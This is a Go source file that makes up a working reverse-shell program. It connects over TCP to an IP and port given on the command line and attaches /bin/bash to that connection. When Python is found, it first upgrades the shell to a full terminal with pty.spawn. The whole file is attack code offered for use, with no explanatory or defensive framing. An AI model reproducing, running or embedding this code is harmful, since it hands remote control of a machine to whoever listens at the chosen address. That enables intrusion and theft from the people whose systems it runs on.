package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("[!]Failed read args.[!]\nUse: reverseshell <ip> <port>")
		log.Fatal("Not completed arguments")
	}
	ip := os.Args[1]
	port := os.Args[2]
	con, _ := net.Dial("tcp", ip+":"+port)

	ispy, err := verifyPython()
	if err != nil {
		con.Write([]byte("Not python instaled.\nContinue normal shell...\n"))
	}
	if ispy {
		cmdpy := exec.Command("python", "-c", "import pty;pty.spawn('/bin/bash')")
		cmdpy.Stdout = con
		cmdpy.Stdin = con
		cmdpy.Stderr = con
		if err := cmdpy.Run(); err != nil {
			log.Fatalln("Error execute python")
		}
	} else {

		cmd := exec.Command("/bin/bash")
		cmd.Stdin = con
		cmd.Stdout = con
		cmd.Stderr = con
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
		}
	}

}

func verifyPython() (bool, error) {
	cmdpy := exec.Command("which", "python")
	e := cmdpy.Run()
	if e != nil {
		return false, e
	}
	return true, nil
}
